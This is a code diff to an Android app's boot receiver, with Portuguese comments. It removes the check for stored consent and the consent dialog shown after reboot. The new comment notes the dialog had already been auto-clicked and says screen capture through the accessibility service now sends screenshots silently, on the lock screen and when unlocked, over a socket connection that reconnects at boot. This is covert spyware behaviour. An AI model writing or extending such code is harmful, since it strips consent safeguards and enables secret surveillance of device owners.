@@ -50,20 +50,12 @@ class BootReceiver : BroadcastReceiver() {
         // Garante um contexto de aplicação estável no SocketManager
         SocketManager.appContext = ctxStorage.applicationContext
 
-        // Verifica se o usuário já consentiu com a captura anteriormente
-        val prefs = ctxStorage.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        val consentimento = prefs.getBoolean("consentimento_captura", false)
-        if (consentimento) {
-            try {
-                val intentMain = Intent(context, MainActivity::class.java)
-                intentMain.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                intentMain.putExtra("AUTO_BOOT_REANIMAR", true)
-                context.startActivity(intentMain)
-                Log.d(TAG, "MainActivity disparada em modo headless para reobtenção de MediaProjection após reboot.")
-            } catch (e: Exception) {
-                Log.e(TAG, "Falha ao iniciar MainActivity no boot: ${e.message}")
-            }
-        }
+        // [SEM MODAL NO REBOOT] Antes, no boot, abríamos a MainActivity headless
+        // (AUTO_BOOT_REANIMAR) para reobter o MediaProjection — o que exibia um
+        // modal de consentimento (mesmo auto-clicado). A pedido, isso foi REMOVIDO:
+        // depois do reboot NÃO aparece nenhum modal. A captura por ACESSIBILIDADE
+        // (takeScreenshot) assume o envio — tanto na tela de bloqueio quanto
+        // desbloqueada (ver ScreenCaptureService: ACTION_RESTART_BOOT e USER_PRESENT).
 
         // Força reconexão imediata do Socket.IO no boot (mesmo antes do desbloqueio)
         try {
